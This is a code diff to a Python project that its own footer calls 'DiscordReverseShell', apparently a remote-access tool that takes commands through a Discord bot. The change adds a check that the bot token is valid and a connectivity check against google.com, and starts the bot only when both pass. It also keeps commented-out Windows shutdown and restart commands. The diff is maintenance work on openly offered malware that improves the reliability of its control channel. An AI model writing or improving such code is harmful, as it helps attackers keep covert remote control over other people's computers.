@@ -85,7 +85,32 @@ session_id = os.urandom(8).hex()
 freezed = False
 #original_dir = os.getcwd()
 
+
+def check_token(token):
+    headers = {
+        "Authorization": f"Bot {token}"
+    }
+
+    url = "https://discord.com/api/v10/users/@me"
+    try:
+        response = requests.get(url, headers=headers)
+    except:
+        return False
     
+    if response.status_code == 200:
+        return True
+    else:
+        return False
+
+def check_internet():
+    try:
+        response = requests.get('http://www.google.com', timeout=5)
+        response.raise_for_status()
+        return True
+    except requests.RequestException:
+        return False
+    
+
 commands = "\n".join([
     "help - Help command",
     "ping - Ping command",
@@ -733,13 +758,15 @@ async def on_message(message):
         embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-    
-try:
-    client.run(TOKEN)
-except:
-    pass
+
+
+if check_internet():
+    if check_token(TOKEN):
+        try:
+            client.run(TOKEN)
+        except:
+            pass
 
 
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
